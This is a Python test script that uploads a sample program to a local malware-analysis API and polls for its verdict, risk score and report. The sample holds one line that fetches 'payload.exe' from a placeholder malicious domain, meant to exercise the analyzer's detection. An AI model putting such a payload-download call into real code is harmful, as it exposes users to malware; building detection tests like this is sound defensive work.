import time
import requests
import os

# Create a small script with curly braces to test
script_content = """
import os
def main():
    file_path = "/tmp/test.txt"
    print(f"Opening file: {file_path}")
    with open(file_path, "w") as f:
        f.write("Hello World")
    
    # Simulating malware behavior for testing
    import urllib.request
    urllib.request.urlopen("http://malicious-domain-example.com/payload.exe")
    
if __name__ == '__main__':
    main()
"""

test_file = "test_malicious_script.py"
with open(test_file, "w") as f:
    f.write(script_content)

print(f"Uploading {test_file} to API...")
try:
    with open(test_file, "rb") as f:
        files = {"file": f}
        resp = requests.post("http://localhost:8000/api/analysis/upload", files=files)
        
    if resp.status_code != 200:
        print(f"Upload failed: {resp.status_code} - {resp.text}")
        exit(1)

    data = resp.json()
    analysis_id = data["analysis_id"]
    print(f"Upload successful! Analysis ID: {analysis_id}")

    for _ in range(60):
        time.sleep(3)
        status_resp = requests.get(f"http://localhost:8000/api/analysis/{analysis_id}")
        if status_resp.status_code != 200:
            print(f"Status check failed: {status_resp.status_code} - {status_resp.text}")
            break
        
        status_data = status_resp.json()
        status = status_data.get("status")
        print(f"Current Status: {status}")
        if status == "completed":
            print("\n=== SUCCESS ===")
            results = status_data.get("results") or {}
            print("Verdict:", results.get("verdict"))
            print("Risk Score:", results.get("risk_score"))
            print("Confidence:", results.get("confidence"))
            print("Report Outline:\n", results.get("report_markdown", "")[:1000])
            break
        elif status == "failed":
            print("\n=== FAILURE ===")
            print("Error:", status_data.get("error"))
            break
finally:
    if os.path.exists(test_file):
        os.remove(test_file)
